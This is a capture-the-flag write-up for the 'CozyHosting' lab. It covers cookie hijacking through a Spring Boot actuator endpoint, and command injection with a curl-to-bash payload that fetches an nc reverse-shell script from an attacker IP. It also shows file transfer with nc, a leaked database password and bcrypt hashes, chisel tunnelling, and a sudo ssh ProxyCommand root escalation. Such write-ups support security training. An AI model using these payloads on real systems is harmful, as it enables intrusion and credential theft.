## CozyHosting

### Lab Details 

- Difficulty: Easy
- Type:Web App, Cookie Hijack, SSRF, Postgre, Linux

#### Initial Foothold 
1. Scan the target
- Run nmap
```
PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp    open     http    syn-ack     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
10207/tcp filtered unknown no-response
11512/tcp filtered unknown no-response
24704/tcp filtered unknown no-response
55229/tcp filtered unknown no-response
58922/tcp filtered unknown no-response
65225/tcp filtered unknown no-response
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19

```
2. Check web app (port 80) for vulnerability
- need to add domain name to `/etc/hosts`
- has login function
- scan for directories
```
$ ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 
<snip>
logout                  [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 220ms]
admin                   [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 654ms]
login                   [Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 544ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 304ms]
index                   [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 428ms]
```
- scan for subdomain, no subdomain found
```
$ ffuf -w ./subdomains-top1million-20000.txt -u http://10.10.11.230 -H "HOST: FUZZ.cozyhosting.htb" -fc 301
```
- check for /.git and error page contains `whitelabel,` which is suggests that the application is using springboot framework
- scan for springboot specific directories
```
$ ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt 
<snip>
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 1038ms]
actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 1040ms]
actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 1039ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 1149ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 1151ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 1149ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 1051ms]
actuator/sessions       [Status: 200, Size: 98, Words: 1, Lines: 1, Duration: 1693ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 812ms]
<snip>
```
- /actuator/sessions endpoint might contain session info of logged in user
- upon on checking the endpoint user cookie `kanderson` can be found 
	```{"8EC5A695FEB440B689ED58B54544692E":"kanderson"}```
- we can try hijack user `kanderson`'s cookie by creating a new entry in cookie in developer mode
```
Name:      Value: 
JSESSIONID 516838480863572275B7355420CD29EC
```
- refresh the login page and we are logged in as `kanderson`

##### SSRF
- after login connection settings can be found at the bottom of the page
- we can try test for SSRF vunerabilities
-  both input field does not output any direct information from the server which mean the vulnerability might be blind
- we can test it with `curl` to see if the remote server make requests to attacker
- one thing to note is that based on the input restriction we can deduce that the hostname field is not vulnerable and username field does not allow spaces to be entered
![[session hijack.png]]
- since space is not allowed we could try using `${IFS}` to substitute for white space  in bash  
- below is an example of the payload 
```
test;curl${IFS}http://10.10.16.20:8000/script.sh|bash;

#where script.sh contains 
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.20 4444 >/tmp/f
```
![[SSRF payload.png]]
#### Lateral Movement (If any)
- once we have received the reverse shell, running `whoami` shows we are user `app` and in the `/app` directory
- `/app` directory contains a file named `cloudhosting-0.0.1.jar`
- we can use `jar` command to de-archive the `jar` file
- need to transfer the file to attacker
```
## on remote
app@cozyhosting:/app$ nc -lvnp 9001 < cloudhosting-0.0.1.jar
nc -lvnp 9001 < cloudhosting-0.0.1.jar
Listening on 0.0.0.0 9001
Connection received on 10.10.16.20 47022

## on attacker
nc 10.10.11.230 9001 > received-file.txt
```
- once we have the `jar` file, we can either extract a single file or unzip it 
- after we have unzipped the file, we can search for files that may contain sensitive information such as `application.properties`
```
$ find ./ -name 'application.properties' 2>/dev/null
./BOOT-INF/classes/application.properties

$ cat ./BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```
- in `application.properties` contains postgresql connection detail
- connection string specifies that the postgres is running on localhost on port 5432
- we can perform local port forwarding to the attacker from remote and search for credentials
```
## on target
app@cozyhosting:/tmp$ /tmp/chisel server --socks5 --port 51234

## on attacker
$ ./chisel client 10.10.11.230:51234 127.0.0.1:5432:127.0.0.1:5432

$ psql -h localhost -U postgres               
Password for user postgres: 
psql (17.4 (Debian 17.4-1), server 14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
Type "help" for help.

postgres=# \list
postgres=# \c cozyhosting
psql (17.4 (Debian 17.4-1), server 14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

cozyhosting=# TABLE users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```
- in the cozyhosting database contains the admin credential hash
- we can decrypt this using online tools like: https://hashes.com/en/decrypt/hash
#### Privilege Escalation
- login to remote with admin credential 
- run `sudo -l`
- user is able to ssh as root
- `gtfobins` has a command that spawns interactive root shell through ProxyCommand 
```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
```

#### Resources
- Springboot enum wordlist: https://git.selfmade.ninja/zer0sec/SecLists/-/blob/eee1651de7906112719066540ca2c5bf688cf9f2/Discovery/Web-Content/spring-boot.txt
- `gtfobins`: https://gtfobins.github.io/gtfobins/ssh/
#### Lesson Learned
- Scan with different wordlists when more information is present, i.e. springboot specific wordlists
